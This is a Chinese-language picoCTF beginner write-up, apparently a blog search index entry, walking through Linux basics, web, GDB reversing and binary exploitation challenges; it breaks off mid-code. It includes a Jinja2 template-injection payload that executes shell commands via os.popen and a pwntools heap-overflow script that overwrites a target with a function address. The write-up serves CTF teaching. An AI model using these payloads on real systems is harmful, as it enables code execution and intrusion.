<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PicoCTF</title>
    <link href="/Nineday.github.io/2025/09/14/PicoCTF/"/>
    <url>/Nineday.github.io/2025/09/14/PicoCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="picoCTF"><a href="#picoCTF" class="headerlink" title="picoCTF"></a>picoCTF</h1><p>bulb: 本文章資料引用<a href="https://play.picoctf.org/practice">picoCTF</a></p><h1 id="學習資料"><a href="#學習資料" class="headerlink" title="學習資料"></a><a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUXbmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXA=">學習資料</a></h1><h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p>為甚麼會有這份WriteUP呢?</p><p>初心是想給同是資安職類的學弟快速上手CTF</p><p>會從非常基礎的部分開始 <del>其實是因為我很爛</del></p><p>希望能讓對資安有興趣的初學者有些幫助</p><h2 id="甚麼是picoCTF"><a href="#甚麼是picoCTF" class="headerlink" title="甚麼是picoCTF?"></a>甚麼是picoCTF?</h2><p>picoCTF是一個專門給學生的資安練習平台和比賽，讓大家可以簡單的學習各種網路安全技巧。裡面的題目很像遊戲關卡，每道題目解出來後會得到一組稱為「旗幟」（Flag）的答案，將對的Flag輸入在題目便能夠獲得積分。</p><p>在picoCTF中，題目涵蓋多種領域，像是:</p><p>Web Exploitation：找出網站可能有的漏洞。</p><p>Cryptography：教你怎麼破解密碼，或是學習加密的原理。</p><p>Reverse Engineering：讓你分析程式，看懂裡面到底在做什麼。</p><p>Forensics：透過分析檔案或網路流量，找到一些隱藏的資訊。</p><p>General Skills：基本的Linux指令使用，或是程式。</p><p>Binary Exploitation：學會找出跟利用程式漏洞。</p><h2 id="準備工作"><a href="#準備工作" class="headerlink" title="準備工作"></a>準備工作</h2><p>在開始體驗CTF前，通常會建議你先安裝好的幾個東西</p><p>Linux 系統或虛擬機：picoCTF的很多題目都基於 Linux 指令，熟悉 Linux 基礎操作會很有幫助。(推薦<a href="https://www.kali.org/get-kali/#kali-platforms">kali Linux</a>)</p><p>CyberChef：一個在線的數據處理工具，可以用來解碼、加密、轉換各種格式。(超好用)</p><p>Burp Suite：用來分析和攔截HTTP請求，適合Web類的題目。(kali裡面有)</p><p>Wireshark：一款網路封包分析工具，可以分析流量和解決網路流量相關題目。(kali裡面也有)</p><h2 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h2><h3 id="Obedient-Cat"><a href="#Obedient-Cat" class="headerlink" title="Obedient Cat"></a>Obedient Cat</h3><p><img src="https://hackmd.io/_uploads/S1QcEe5YJg.png" alt="image"></p><p>這題雖然是可以用windows記事本直接打開檔案看flag，但既然都要學了，不如用題目想教我們的方法作吧!</p><p>仔細看，如果有用過linux的人其實不難發現，題目的名字裡藏了一個linux的指令<strong>cat</strong>，這個指令能夠查看目前指定的檔案內容，只需要照著格式<br><code>cat [檔案名稱]</code><br>在linux的終端輸入就能夠查到flag囉。<br><img src="https://hackmd.io/_uploads/BkKsbqOZkl.png" alt="image"></p><h3 id="Wave-a-flag"><a href="#Wave-a-flag" class="headerlink" title="Wave a flag"></a>Wave a flag</h3><p><img src="https://hackmd.io/_uploads/BJ2CEx9Kkl.png" alt="image"></p><p>這題必須在shell上作，先使用”<strong>wget</strong>“這個指令把檔案載下來<br><img src="https://hackmd.io/_uploads/rJPTJ9OZyx.png" alt="image"></p><p>再用”<strong>.&#x2F;</strong>“執行剛剛下載的檔案   linux執行檔案: <strong>.&#x2F;&lt;檔案名稱&gt;.&#x2F;目錄</strong><br>所以只需打上 <strong>.&#x2F;warm</strong> 照理說就能夠拿到flag了。<br><img src="https://hackmd.io/_uploads/rkDZl9OWyg.png" alt="image"><br>納尼，他居然說我沒有權限執行此檔案<br>其實很簡單，只需修改檔案權限就好，那要如何修改檔案權限呢?<br><code>chmod +x &lt;檔案名&gt;</code><br>ch是change的縮寫 mod則是模式<br>合在一起就是更改模式，在後面加上參數 “<strong>+x</strong>“” 並後註檔名就更改成功囉。<br>再執行一次看看<br><img src="https://hackmd.io/_uploads/HJ82zc_-yl.png" alt="image"><br>果然可以了，但是卻沒有出現flag，只出現一條訊息。<br>上面是叫你打開他的時候加上參數 “<strong>-h</strong>“看看<br><img src="https://hackmd.io/_uploads/Hyeof7qdb1l.png" alt="image"><br>喔喔喔! flag果然出現了</p><h3 id="Python-Wrangling"><a href="#Python-Wrangling" class="headerlink" title="Python Wrangling"></a>Python Wrangling</h3><p><img src="https://hackmd.io/_uploads/BySMoRw-ye.png" alt="image"></p><p>一樣，先用 <strong>wget</strong> 把檔案下載下來，這題有三個檔案，所以要分別把他們都載下來。<br><img src="https://hackmd.io/_uploads/H1jF85OZyg.png" alt="image"><br>可以看出，這裡面有一個python程式，大致上就是一個解碼程式，而正巧<br>這題也給了一串密碼，我們先用<strong>cat</strong>看看這個password<br><code>dbd1bea4dbd1bea4dbd1bea4dbd1bea4</code></p><p>嗯？看不出來是甚麼，沒關係，我們先<strong>cat</strong> flag<br><code>gAAAAABgUAIWuksW6PU7W1WFXiBWkF2S8VhtL_5335iazHhuBnWloiyt3ZAFwR2zyuG7iZLSVPaQIZLTxgo-WXIk6Cnk7-KZm1g1qo_v1zDMK5wDocmVFxL0o5ae6OrB9VKdh3HerIsy</code></p><p>這看來就是flag了，不過他被一個我們不知道的方式加密了，沒辦法用:P<br>但不要忘記，我們可是還有一個解碼程式的，看來剛剛的python程式就是為了此刻而生的！<br>我們只需用這個程式碼來打開這個flag，輸入<strong>python ende.py -d flag.txt.en</strong><br><img src="https://hackmd.io/_uploads/SyYajquZ1g.png" alt="image"><br>這個程式叫我們輸入密碼，我們就將剛剛pw檔內的password輸入進去。<br><img src="https://hackmd.io/_uploads/BkEQhcd-Jx.png" alt="image"><br>flag總算出來了!</p><h3 id="Nice-netcat…"><a href="#Nice-netcat…" class="headerlink" title="Nice netcat…"></a>Nice netcat…</h3><p><img src="https://hackmd.io/_uploads/ByQ010vbJg.png" alt="image"><br>題目裡面叫我們在shell裡面跟一個伺服器上的program對話，但他卻說他不會說英文? 有意思<br>我們先用<strong>nc</strong>這個指令連上伺服器<br><code>nc mercury.picoctf.net 43239</code><br><img src="https://hackmd.io/_uploads/ry6raodWJe.png" alt="image"><br>這個程式回了好多數字，有點像是<strong>ASCII碼</strong>的樣子<br><code>112  105  99  111  67  84  70  123  103  48  48  100  95  107  49  116  116  121  33  95  110  49  99  51  95  107  49  116  116  121  33  95  55  99  48  56  50  49  102  53  125  10 </code><br>於是我們將他丟進ASCII的解碼器裡面。<br><img src="https://hackmd.io/_uploads/SyNT02db1x.png" alt="image"><br>哇，flag出現了欸</p><h3 id="Lets-Warm-Up"><a href="#Lets-Warm-Up" class="headerlink" title="Lets Warm Up"></a>Lets Warm Up</h3><p><img src="https://hackmd.io/_uploads/Hkc4eRDb1l.png" alt="image"><br>這題題目講得很詳細，也不需要動甚麼腦，基本上只需要找到十六進制以 0x70 開頭的字，並加在CTF的格式裡就行。雖然知道方向了，但到底該怎麼做呢?</p><p>只需要打開<strong>Cyberchef</strong>，<br>選擇<strong>from Hex</strong><br><img src="https://hackmd.io/_uploads/B1k6Hau-1e.png" alt="image"></p><p>將題目說的0x70輸入在input內</p><p>output就出現答案了<br><img src="https://hackmd.io/_uploads/S1_kLa_Zye.png" alt="image"></p><p>在把這個字母<strong>p</strong>加入進picoCTF{p} 就是flag了喔</p><h3 id="Warmed-Up"><a href="#Warmed-Up" class="headerlink" title="Warmed Up"></a>Warmed Up</h3><p><img src="https://hackmd.io/_uploads/B1k7SRDbJg.png" alt="image"><br>題目問 0x3D（十六進位）轉換成十進位是多少<br>將0x3D分解成 3x16的一次方 + Dx16的0次方<br>D代表10進位的13 所以<br>3x16&#x3D;48 13x1&#x3D;13 把他們相加後&#x3D;62<br>所以picoCTF{62}就是這題的答案囉</p><p>也能利用ASCII表來轉換數字(在表內找到0x3D對應的數字)<br><img src="https://hackmd.io/_uploads/BJAyarVM1x.png" alt="image"></p><h3 id="2Warm"><a href="#2Warm" class="headerlink" title="2Warm"></a>2Warm</h3><p><img src="https://hackmd.io/_uploads/r1YivRPZJl.png" alt="image"><br>這題又更簡單了，題目問 42的二進位是多少<br>我這邊提供一個算法 當然還有其他的但我習慣了</p><p><strong>不斷除以 2：從 42 開始，一直用 2 去除這個數字，每次把「餘數」記下來。<br>每次記餘數，直到除到 0：這個餘數會是 0 或 1，記得從 最後的餘數往回寫！</strong><br>42 ÷ 2 &#x3D; 21，餘數 0<br>21 ÷ 2 &#x3D; 10，餘數 1<br>10 ÷ 2 &#x3D; 5，餘數 0<br>5 ÷ 2 &#x3D; 2，餘數 1<br>2 ÷ 2 &#x3D; 1，餘數 0<br>1 ÷ 2 &#x3D; 0，餘數 1<br>再把餘數倒著排序 會是<strong>101010</strong><br>picoCTF{101010}就是本題的答案囉</p><h3 id="what’s-a-net-cat"><a href="#what’s-a-net-cat" class="headerlink" title="what’s  a net cat?"></a>what’s  a net cat?</h3><p><img src="https://hackmd.io/_uploads/ByuzuCPZJe.png" alt="image"><br>題目這邊說要使用nc(netcat)來連接至<strong>jupiter.challenges.picoctf.org</strong>的<strong>port41120</strong><br>先用nc連接伺服器看看<br><img src="https://hackmd.io/_uploads/Bk4gK8NGJx.png" alt="image"><br>他說沒有port能夠連接 因為我們在這裡沒有打上連接埠(也就是port)<br>所以我們必須在後面加上題目給的連接埠 <strong>41120</strong><br><strong>nc jupiter.challenges.picoctf.org 41120</strong><br><img src="https://hackmd.io/_uploads/rJM198Efyg.png" alt="image"><br>flag果然出現了</p><h3 id="Tab-Tab-Attack"><a href="#Tab-Tab-Attack" class="headerlink" title="Tab,Tab Attack"></a>Tab,Tab Attack</h3><p><img src="https://hackmd.io/_uploads/Hk-UFRwWkl.png" alt="image"></p><h2 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="Insp3ct0r"><a href="#Insp3ct0r" class="headerlink" title="Insp3ct0r"></a>Insp3ct0r</h3><p><img src="https://hackmd.io/_uploads/By-E7nZzke.png" alt="image"><br>這個題目給了我們一個網站，我們連接上去看看<br><img src="https://hackmd.io/_uploads/B1AH_1fMyg.png" alt="image"><br>看起來蠻普通的，但是，題目暗示我們去檢查這個網站(也就是按F12)<br>按照順序是檢查Html、Css、JavaScript<br><img src="https://hackmd.io/_uploads/HJBodkGG1l.png" alt="image"><br>哦哦哦!是flag，不過好像只有前面一部份而已，所以我們往Css前進<br><img src="https://hackmd.io/_uploads/SyNAOJzf1g.png" alt="image"><br>第二部分的Flag也出現了，只要找到最後一段就成功了，我們再往JS找看看<br><img src="https://hackmd.io/_uploads/BkAMtkzfye.png" alt="image"><br>最後再把三段Flag合在一起就是答案囉</p><h3 id="GET-aHEAD"><a href="#GET-aHEAD" class="headerlink" title="GET aHEAD!"></a>GET aHEAD!</h3><p><img src="https://hackmd.io/_uploads/SJXn7nWzJx.png" alt="image"></p><h3 id="where-are-the-robots"><a href="#where-are-the-robots" class="headerlink" title="where are the robots"></a>where are the robots</h3><p><img src="https://hackmd.io/_uploads/SkUgE3Zfyl.png" alt="image"></p><h3 id="Trickster"><a href="#Trickster" class="headerlink" title="Trickster"></a>Trickster</h3><p><img src="https://hackmd.io/_uploads/S1St0j-Qye.png" alt="image"></p><h3 id="SSTI1"><a href="#SSTI1" class="headerlink" title="SSTI1"></a>SSTI1</h3><p><img src="https://hackmd.io/_uploads/Byn9QLebgl.png" alt="image"></p><p>先確定題目網站使用的模板引擎為何</p><blockquote><p>以下是常見的模板引擎:<br>Jinja2（Python Flask&#x2F;Django）：​49 → 預期輸出 49</p><p>Twig（PHP Symfony）：​49 → 預期輸出 49</p><p>Smarty（PHP）：​{$7*7} → 預期輸出 49</p><p>Freemarker（Java）：​${7*7} → 預期輸出 49​<br><img src="https://hackmd.io/_uploads/Hkl-r8ebgl.png" alt="image"><br><img src="https://hackmd.io/_uploads/SksZSUeZgg.png" alt="image"><br>從上可知致個網站是使用Jinja</p></blockquote><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">self._TemplateReference__context.cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27; whoami &#x27;</span>).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p>最後使用payload注入即可</p><h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><h3 id="GDB-Test-Drive"><a href="#GDB-Test-Drive" class="headerlink" title="GDB Test Drive"></a>GDB Test Drive</h3><p><img src="https://hackmd.io/_uploads/SymiSd_Vyx.png" alt="image"><br>這題是介紹使用GDB的幾個最基礎的指令，底下我會一個一個的實際操作一次</p><p>第一個<br><code>chmod +x gdbme</code><br><img src="https://hackmd.io/_uploads/BJaKwdu41g.png" alt="image"><br>chmod +x是可以強制檔案給我們執行的權限，如果沒有先使用這個指令<br>有些檔案可能就會無法執行</p><p>第二個<br><code>gdb gdbme</code><br><img src="https://hackmd.io/_uploads/BJtCuudNye.png" alt="image"><br>gdb是使用GDB來開啟gdbme這個檔案，底下可能會跑出一些東西<br>它們都是GDB的一些相關資訊和使用方式</p><p>第三個<br><code>layout asm</code><br><img src="https://hackmd.io/_uploads/rJE_qOO4yg.png" alt="image"><br>在調試器裡打上<code>layout asm</code>後，按下Enter鍵，會跳出匯編視窗<br><img src="https://hackmd.io/_uploads/Hktq5OOEJe.png" alt="image"><br>匯編視窗裡會顯示函數、函數的偏移量和原始碼，如果要跳回終端機，只需按Ctrl+Z<br>，即可返回終端機畫面</p><p>第四個<br><code>break *(main+99)</code><br><img src="https://hackmd.io/_uploads/Hk1F2u_41e.png" alt="image"><br><code>break</code>可在原始碼中，需找到相應的函數和偏移量，即可在相對應的地方設上斷點<br>當程式執行時，就會停在斷點處</p><p>第五個<br><code>run</code><br><img src="https://hackmd.io/_uploads/HynCRddN1g.png" alt="image"><br>執行程式，跑到斷點時停下，底下會出現停下的地方</p><p>第六個<br><code>jump *(main+104)</code><br><img src="https://hackmd.io/_uploads/rJXReFuNJg.png" alt="image"><br><code>jump</code>就如它字面上的意思一樣，會跳到你指定的函數和偏移量<br>而這題的flag就跑出來了</p><h3 id="GDB-baby-step-1"><a href="#GDB-baby-step-1" class="headerlink" title="GDB baby step 1"></a>GDB baby step 1</h3><p><img src="https://hackmd.io/_uploads/rk6yGFdN1l.png" alt="image"><br>這題給了一個檔案，需要在檔案中找出CTF</p><p><img src="https://hackmd.io/_uploads/SJoJ44aN1e.png" alt="image"><br>老樣子先強制修改它的執行權限，如果沒有修改檔案會不能用GDB執行</p><p><img src="https://hackmd.io/_uploads/rJ9OV4p4Jl.png" alt="image"><br>使用GDB執行它</p><p><img src="https://hackmd.io/_uploads/rJSeBN64kg.png" alt="image"><br>使用<code>layout asm</code>打開此檔案的匯編視窗，就可以看到原始碼</p><p><img src="https://hackmd.io/_uploads/HkGbUt6Eye.png" alt="image"><br>題目中有說CTF中的內容會以16進制的方式出現，然後再把它轉回10進制<br>或者直接輸出出來，就會是答案了</p><p><img src="https://hackmd.io/_uploads/r1HyPKTEke.png" alt="image"><br>這裡我的做法是直接用<code>print</code>把它直接輸出出來，然後再把它放進picoCTF{}<br>裡面</p><p><img src="https://hackmd.io/_uploads/rkE15F6Vyg.png" alt="image"><br><code>picoCTF&#123;549698&#125;</code>就是這題的CTF了</p><h3 id="GDB-baby-step-2"><a href="#GDB-baby-step-2" class="headerlink" title="GDB baby step 2"></a>GDB baby step 2</h3><p><img src="https://hackmd.io/_uploads/H11KIIeHJl.png" alt="image"><br>跟 GDB baby step 1 一樣，要找出它藏在eax暫存器裡面的CTF內容</p><p><img src="https://hackmd.io/_uploads/rk5X3IlSye.png" alt="image"><br>用<code>chmod +x</code>修改他的執行權限</p><p><img src="https://hackmd.io/_uploads/HymDnLlH1x.png" alt="image"><br>使用GDB執行他</p><p><img src="https://hackmd.io/_uploads/rkUtnUeB1x.png" alt="image"><br>使用<code>layout asm</code>叫出匯編視窗</p><p><img src="https://hackmd.io/_uploads/ByrRQPeHkg.png" alt="image"><br>我第一次設的斷點在<code>(main +56)</code>，但把eax輸出出來後，發現CTF是錯的</p><p><img src="https://hackmd.io/_uploads/rynU4vgr1l.png" alt="image"><br>所以我就讓執行檔執行到下一步，跑到<code>main+59</code>，在輸出一次<code>$eax</code>，就是這題的CTF了</p><h3 id="GDB-baby-step-3"><a href="#GDB-baby-step-3" class="headerlink" title="GDB baby step 3"></a>GDB baby step 3</h3><p><img src="https://hackmd.io/_uploads/B18pQO3Dkx.png" alt="image"><br>需要在main funtion，找到0x2262c96b這個函數，再使用GDB指令<code>x/4xb</code>，列印出4個位元組的值</p><p><img src="https://hackmd.io/_uploads/rkGmYp6DJx.png" alt="image"><br>用<code>chmod +x</code>修改他的執行權限</p><p><img src="https://hackmd.io/_uploads/S13f1RTDkl.png" alt="image"><br>用GDB開啟debugger0_c這個題目的檔案</p><p><img src="https://hackmd.io/_uploads/Sy59JCTvJg.png" alt="image"><br>用<code>layout asm</code>打開彙編視窗</p><p><img src="https://hackmd.io/_uploads/B1DIxC6Dkx.png" alt="image"><br>把斷點設在<code>main+22</code>的地方，並執行</p><p><img src="https://hackmd.io/_uploads/HkEkW06v1x.png" alt="image"><br>因為檔案把<code>0x2262c96b</code>的值存入了<code>$rbp</code>所以輸出出來看一下它的值為多少，結果不是我們要找的東西</p><p><img src="https://hackmd.io/_uploads/SyEqXRTv1g.png" alt="image"><br>看到下一行是把<code>$rpb-4</code>的位置存到<code>%eax</code>裡面，所以也輸出出來看看，結果也不是我們要的東西</p><p><img src="https://hackmd.io/_uploads/SyAw8RpP1l.png" alt="image"><br>到這時，回去看了一眼題目，發現它有提到<code>x/4xb</code>這個指令，所以試試看用<code>x/4xb</code>，把<code>$rbp</code>後面加上偏移量<code>-0x4</code>(需轉成10進制)輸出出來，就出現這題需要的東西了</p><p><img src="https://hackmd.io/_uploads/S1hzFATvyx.png" alt="image"><br>再按照題目要求組起來，放進picoCTF{}裡就好了</p><h3 id="GDB-baby-step-4"><a href="#GDB-baby-step-4" class="headerlink" title="GDB baby step 4"></a>GDB baby step 4</h3><p><img src="https://hackmd.io/_uploads/B1Qi7Nk_yg.png" alt="image"><br> main funtion 會呼叫一個 funtion ，需要在這個 funtion 中找到<code>eax</code>，如果找到的是以16進制的，則需轉成10進制</p><p><img src="https://hackmd.io/_uploads/ryBPIb1K1x.png" alt="image"><br>用<code>chmod +x</code>修改他的執行權限，並使用GDB執行它</p><p><img src="https://hackmd.io/_uploads/rygj8ZJFJe.png" alt="image"><br>用<code>layout asm</code>打開彙編視窗</p><p><img src="https://hackmd.io/_uploads/SyxcPZkYJl.png" alt="image"><br>把斷點設在<code>main+38</code>執行(因為<code>main+38</code>呼叫了一個funtion)</p><p><img src="https://hackmd.io/_uploads/B1rhvWkKJe.png" alt="image"><br>用<code>si</code>進入 main 所呼叫的 funtion 裡面，在<code>func1+14</code>有一個16進制的數存進了eax中</p><p><img src="https://hackmd.io/_uploads/Sy0gFbyFyx.png" alt="image"><br>所以一路執行到<code>func1+14</code>後，用<code>print /d</code>把<code>0x3269</code>轉成10進制並輸出出來，就是此題的需要的東西了</p><p><img src="https://hackmd.io/_uploads/SJui9WJYyx.png" alt="image"><br>把剛剛的10進制放進picoCTF{}裡就好了，就是此題的答案了</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="暫無"><a href="#暫無" class="headerlink" title="暫無"></a>暫無</h3><h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h2><h3 id="heap-2"><a href="#heap-2" class="headerlink" title="heap 2"></a>heap 2</h3><p><strong><code>ssh user@server -p 2222</code></strong></p><p>這題給你一個模擬Stack overflow的環境<br>題目還給了source跟.ELF<br>先連線看看</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Enter your choice: 1<br>[*]  <span class="hljs-built_in"> Address </span>  -&gt;   Value   <br>+-------------+-----------+<br>[*]   0x18d62b0  -&gt;   pico<br>+-------------+-----------+<br>[*]   0x18d62d0  -&gt;   bico<br><br>1. <span class="hljs-built_in">Print</span> Heap<br>2. Write <span class="hljs-keyword">to</span> buffer<br>3. <span class="hljs-built_in">Print</span> x<br>4. <span class="hljs-built_in">Print</span> Flag<br>5. Exit<br><br>Enter your choice: <br></code></pre></td></tr></table></figure><p>看來是要讓他Overflow</p><blockquote><p>0x18d62d0 - 0x18d62b0 &#x3D; 0xc0 &#x3D; 32</p></blockquote><p>只要輸入32個字元就會讓他Overflow<br>再去看看source</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        print_menu();<br>        <span class="hljs-keyword">if</span> (scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice) != <span class="hljs-number">1</span>) <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><br>        switch (choice) &#123;<br>        case <span class="hljs-number">1</span>:<br>            <span class="hljs-regexp">//</span> print heap<br>            print_heap();<br>            <span class="hljs-keyword">break</span>;<br>        case <span class="hljs-number">2</span>:<br>            write_buffer();<br>            <span class="hljs-keyword">break</span>;<br>        case <span class="hljs-number">3</span>:<br>            <span class="hljs-regexp">//</span> print safe_var<br>            printf(<span class="hljs-string">&quot;\n\nTake a look at my variable: safe_var = %s\n\n&quot;</span>,<br>                   safe_var);<br>            fflush(stdout);<br>            <span class="hljs-keyword">break</span>;<br>        case <span class="hljs-number">4</span>:<br>            <span class="hljs-regexp">//</span> Check <span class="hljs-keyword">for</span> win condition<br>            check_win();<br>            <span class="hljs-keyword">break</span>;<br>        case <span class="hljs-number">5</span>:<br>            <span class="hljs-regexp">//</span> <span class="hljs-keyword">exit</span><br>            return <span class="hljs-number">0</span>;<br>        default:<br>            printf(<span class="hljs-string">&quot;Invalid choice\n&quot;</span>);<br>            fflush(stdout);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">void check_win() ，<br>    <span class="hljs-keyword">if</span> (!strcmp(safe_var, <span class="hljs-string">&quot;pico&quot;</span>)) &#123;<br>        printf(<span class="hljs-string">&quot;\nYOU WIN\n&quot;</span>);<br><br>        <span class="hljs-regexp">//</span> Print flag<br>        char buf[FLAGSIZE_MAX];<br>        FILE *fd = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>        fgets(buf, FLAGSIZE_MAX, fd);<br>        printf(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>        fflush(stdout);<br><br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        printf(<span class="hljs-string">&quot;Looks like everything is still secure!\n&quot;</span>);<br>        printf(<span class="hljs-string">&quot;\nNo flage for you :(\n&quot;</span>);<br>        fflush(stdout);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要call到win就可以得到flag</p><p>開始解題：<br><code>$file chall</code>可以知道這個檔案是<strong>Little Endian</strong></p><p><code>$objdump -D chall | grep win</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ objdump -D chall | <span class="hljs-keyword">grep</span> win<br><span class="hljs-number">00000000004011</span>a0 <span class="hljs-symbol">&lt;win&gt;</span>:<br><span class="hljs-number">00000000004011</span>f0 <span class="hljs-symbol">&lt;check_win&gt;</span>:<br></code></pre></td></tr></table></figure><p>得到win fuction 的位置<br>接著只要overflow後把win fuction的位置寫入進去就可以得到flag</p><p>以下是script</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix">from pwn <span class="hljs-built_in">import</span> <span class="hljs-operator">*</span><br><br><span class="hljs-attr">p</span> <span class="hljs-operator">=</span> remote(<span class="hljs-string">&quot;mimas.picoctf.net&quot;</span>,<span class="hljs-number">52580</span>)<br><br>p.sendline(b<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(b<span class="hljs-string">&quot;buffer:&quot;</span>)<br><br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>):<br>    p.send(b<span class="hljs-string">&quot;1234&quot;</span>)<br>    <br>p.sendline( <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>11<span class="hljs-char escape_">\x</span>40<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span>)<br><br>p.recvuntil(b<span class="hljs-string">&quot;choice:&quot;</span>)<br>p.sendline(b<span class="hljs-string">&quot;4&quot;</span>)<br><br>print(p.recvall())<br></code></pre></td></tr></table></figure><h3 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h3><p>這題給你一個<br>題目還給了source跟.ELF<br>先連線看看</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$nc saturn.picoctf.net <span class="hljs-number">55876</span><br>Please enter your <span class="hljs-built_in">string</span>: <br>a<br>Okay, time <span class="hljs-keyword">to</span> <span class="hljs-keyword">return</span><span class="hljs-params">...</span> Fingers Crossed<span class="hljs-params">...</span> Jumping <span class="hljs-keyword">to</span> <span class="hljs-number">0x804932f</span><br></code></pre></td></tr></table></figure><p>再看看source</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span>&#123;<br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-type">gid_t</span> gid = <span class="hljs-built_in">getegid</span>();<br>  <span class="hljs-built_in">setresgid</span>(gid, gid, gid);<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please enter your string: &quot;</span>);<br>  <span class="hljs-built_in">vuln</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">void win() &#123;<br>  char buf[FLAGSIZE];<br>  FILE *f = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (f == NULL) &#123;<br>    